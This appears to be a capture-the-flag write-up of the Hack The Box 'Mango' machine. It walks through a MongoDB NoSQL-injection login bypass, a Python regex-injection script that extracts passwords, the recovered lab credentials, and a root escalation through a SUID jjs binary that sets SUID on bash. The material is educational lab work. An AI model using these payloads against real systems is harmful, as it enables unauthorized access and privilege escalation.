---
"title": "Hack The Box - Mango"
"date": 2020-04-18
"tags": ["linux", "medium", "suid", "mongodb"]
"keywords": ["linux", "medium", "suid", "mongodb"]
"author": "Ghostbyt3"
"description": "We are going to pwn Mango from Hack The Box."
"featured_image": "/img/htb-mango/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "Writeup"
---


![Untitled](/img/htb-mango/Untitled.png)

We are going to pwn Mango from Hack The Box.

Link : [https://www.hackthebox.eu/home/machines/profile/230](https://www.hackthebox.eu/home/machines/profile/214)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results:

    PORT    STATE SERVICE
    22/tcp  open  ssh
    80/tcp  open  http
    443/tcp open  https
    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
    |   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
    |_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
    80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: 403 Forbidden
    443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Mango | Search Base
    | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
    | Not valid before: 2019-09-27T14:21:19
    |_Not valid after:  2020-09-26T14:21:19
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  http/1.1
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%), Linux 3.18 (93%), Android 4.2.2 (Linux 3.4) (93%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## HTTP:

Started with HTTP , It seems like I get Forbidden error message. Weird, Let's check HTTPS.

![Untitled](/img/htb-mango/Untitled%201.png)

## HTTPS:

It looks like a search engine. But If I tried searching any I get `0 results found`. 

![Untitled](/img/htb-mango/Untitled%202.png)

While checking the Certificate of the webpage, I found the Common Name `staging-order.mango.htb`, so i added it to my `/etc/hosts`

![Untitled](/img/htb-mango/Untitled%203.png)

`staging-order.mango.htb`

![Untitled](/img/htb-mango/Untitled%204.png)

Its a login page.I tried some SQL injection methods, Didn't Worked.

## NoSQL Injection:

Why it is not a MongoDB injection. Since the name of the box looks like a hint.

I searched for the exploits and found 

> [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

> [https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/](https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/)

So According to PayloadsALLTheThings, I started with Authentication Bypass.

I captured the login request in Burp and send that to repeater.

``username[$ne]=admin&password[$ne]=admin&login=login``
![Untitled](/img/htb-mango/Untitled%205.png)

`302 Found` I followed the redirection. It seems like I bypassed the login.

But it doesn't have anything on it. Why don't we try to extract the password using the script in the PayloadsALLTheThings

![Untitled](/img/htb-mango/Untitled%206.png)

I tried using the user `admin` first to check whether our script works. I did some modifications on the script from PayloadsALLTheThings.

    import requests
    import string
    flag = "^"
    url = "http://staging-order.mango.htb" 
    restart = True  
    while restart:
        restart = False 
        
        for i in string.ascii_letters + string.digits + "~>[]!@#$%^()@_{}":
            payload = flag + i
            post_data = {'username': 'admin', 
    		     'password[$regex]': payload + ".*"}
              
    	r = requests.post(url, data=post_data, allow_redirects=False)
            if r.status_code == 302:
                print(payload)
                restart = True
                flag = payload

So How this works? This python script will bruteforce the password for the user by one by one character. If the character is correct it will give `302 Found`.  And for all other characters, it gives back the status code `200`.  So each time `302 redirect` is seen, it will restart the loop and started brute-forcing the second character.

By doing so I got the password for `admin`[br/](br/)
![Untitled](/img/htb-mango/Untitled%207.png)

``admin:t9KcS3>!0B#2``

Let's try the same script with `mango` as a user. (Just a Guess)[br/](br/)
![Untitled](/img/htb-mango/Untitled%208.png)

And I got the password.
``mango:h3mXK8RhU~f{]f5H``

## Getting a shell as mango:

Logged in as `mango` in ssh but it seems like it doesn't have the User flag. But `admin` has the flag.

![Untitled](/img/htb-mango/Untitled%209.png)

## Getting shell as admin:

I tried login with `ssh` using the password we got already but didn't worked, so I `su` from user `mango` and it worked!

![Untitled](/img/htb-mango/Untitled%2010.png)

## Privilege Escalation:

I uploaded my Linux Enumeration Script and found some `SETUID` Binaries.

![Untitled](/img/htb-mango/Untitled%2011.png)

`run-mailcap` seems like it didn't work. I searched for `jjs` in [GTFObins](https://gtfobins.github.io/gtfobins/jjs/),

We can get the root flag quickly by using the `FIle Read` method.

![Untitled](/img/htb-mango/esgeg.png)

The Shell thing didn't work, But it looks like it executes `/bin/sh`, so Instead of that  tried to give SUID to bash.

```echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh [$(tty) ]($(tty) )$(tty) 2>$(tty)').waitFor()" | jjs```

```
    $ jjs 
    Warning: The jjs tool is planned to be removed from a future JDK release
    jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()
    0
    jjs> 
    $ /bin/bash -p
    bash-4.4# whoami
    root
    bash-4.4#
```
We are Root!